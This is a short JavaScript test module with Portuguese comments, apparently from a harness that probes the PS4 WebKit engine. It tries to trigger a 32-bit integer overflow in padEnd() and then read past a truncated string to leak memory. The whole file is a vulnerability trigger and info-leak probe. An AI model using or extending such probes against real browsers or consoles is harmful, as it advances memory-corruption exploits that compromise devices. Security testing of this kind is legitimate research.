export default {
    id:       'STRING_MATH_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'CRITICAL',
    description:
        'Heap Buffer Overflow no C++ WTF::String. Abusa do cálculo de 32-bits na função padEnd(). ' +
        'O tamanho alvo excede 0xFFFFFFFF, causando truncamento interno. O motor aloca um buffer ' +
        'pequeno, mas o loop de cópia tenta preencher a RAM inteira.',

    setup: function() {
        this.results = {};
        // Criamos uma string base razoável (16MB) para não esgotar a RAM do PS4 de imediato
        this.baseString = "A".repeat(16 * 1024 * 1024); 
    },

    trigger: function() {
        try {
            // O GATILHO: 
            // 0xFFFFFFFF é o limite de 32-bits (4294967295).
            // Passamos um número marginalmente superior. Se o C++ for vulnerável,
            // (0xFFFFFFFF + 5) transforma-se internamente em '4'.
            // Ele aloca 4 bytes, mas o motor de cópia usa o valor gigante e transborda!
            let toxicLength = 0xFFFFFFFF + 5; 
            
            // Tentamos forçar a criação da string corrompida
            this.results.corruptedStr = this.baseString.padEnd(toxicLength, "B");
            
        } catch(e) {
            // O LLInt (interpretador) deve apanhar isto e atirar "RangeError: Invalid string length"
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O motor C++ bloqueou com RangeError?
        s => s.results.error || 'Matemática Aceite! Cuidado!',
        
        // Probe 1: O Leitor de Overflow
        s => {
            if (s.results.corruptedStr) {
                try {
                    // Se a string foi criada, o seu tamanho pode estar truncado (ex: length == 4).
                    // Vamos tentar ler um índice muito além do tamanho truncado.
                    // Se ler memória RAM, temos um Info Leak brutal.
                    let charCode = s.results.corruptedStr.charCodeAt(100);
                    if (!isNaN(charCode) && charCode !== 65 && charCode !== 66) {
                        return charCode; // Dispara o STALE DATA no HUD
                    }
                    return 'Leu Zeros/Seguro';
                } catch(e) {
                    return `Crash Seguro na Leitura`;
                }
            }
            return 0; // Protegido (Baseline)
        }
    ],

    cleanup: function() {
        this.baseString = null;
        this.results = {};
    }
};
